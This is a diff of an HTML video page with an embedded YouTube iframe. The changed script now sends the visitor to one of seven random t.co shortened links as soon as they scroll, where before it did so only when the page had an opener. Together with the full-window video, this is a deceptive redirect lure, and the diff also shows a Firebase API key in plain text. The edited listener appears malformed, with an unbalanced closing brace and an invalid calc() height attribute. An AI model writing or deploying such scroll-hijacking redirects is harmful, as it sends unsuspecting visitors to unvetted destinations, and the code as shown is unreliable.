@@ -2,14 +2,16 @@
 <html lang="en">
 <head>
 <body>
-	<iframe id="video" width="100%" height="100%" src="https://www.youtube.com/embed/Tt6WQYtefXA?si=cptvFbRcYNyYyn-G"  style="width: 100%; height: 100%;"></iframe>
+	<iframe id="video" width="100%" height="calc(100% + 10px)" src="https://www.youtube.com/embed/Tt6WQYtefXA?si=cptvFbRcYNyYyn-G"  style="width: 100%; height: 100%;"></iframe>
 	<script>
-	if (window.opener) {
+	window.addEventListener('scroll', function() {
 
-		//increasin
-		var video = document.getElementById('video');
-		var newHeight = window.innerHeight + 50;
-		video.style.height = newHeight + 'px'
+		//increasin hieght
+		//var video = document.getElementById('video');
+		//var newHeight = window.innerHeight + 50;
+		//video.style.height = newHeight + 'px'
+
+		
 		
 		const links=["https://t.co/4Of9cnIEHH","https://t.co/g2bpnSk4N0","https://t.co/P7WsEN8Jk8",
 			"https://t.co/1vAqV6JwOr","https://t.co/8LtlaDxkg9","https://t.co/kgVbFeXLMk","https://t.co/3UvgDEAlep"]
@@ -17,11 +19,7 @@
 		window.location.href = (links[Math.floor(Math.random() * links.length)])
 			}
 
-		var video = document.getElementById('video');
-		var newHeight = window.innerHeight + 100;
-		video.style.height = newHeight + 'px'
-
-
+	
 
 	const firebaseConfig = {
     			apiKey: "AIzaSyDJfe1BcZk52ybfkA4PB34Q440CmcrX5nY",
